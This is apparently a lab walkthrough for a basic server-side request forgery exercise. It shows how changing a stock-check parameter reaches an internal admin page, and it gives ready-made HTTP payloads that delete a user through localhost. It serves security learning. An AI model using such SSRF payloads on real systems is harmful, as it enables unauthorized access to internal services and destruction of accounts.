
# Basic SSRF against the local server

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

There is a button to check the stock:

It generates this POST request:

The stockApi parameter contains the url “http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1”, and we can tryo to change it to other url:

For example we can check the content of the /admin page:

```
POST /product/stock HTTP/2
...

stockApi=http://localhost/admin
```

From the source code we find using a GET request we can delete a user:

So we can delete “carlos” with this payload:

```
POST /product/stock HTTP/2
...

stockApi=http://localhost/admin/delete?username=carlos
```
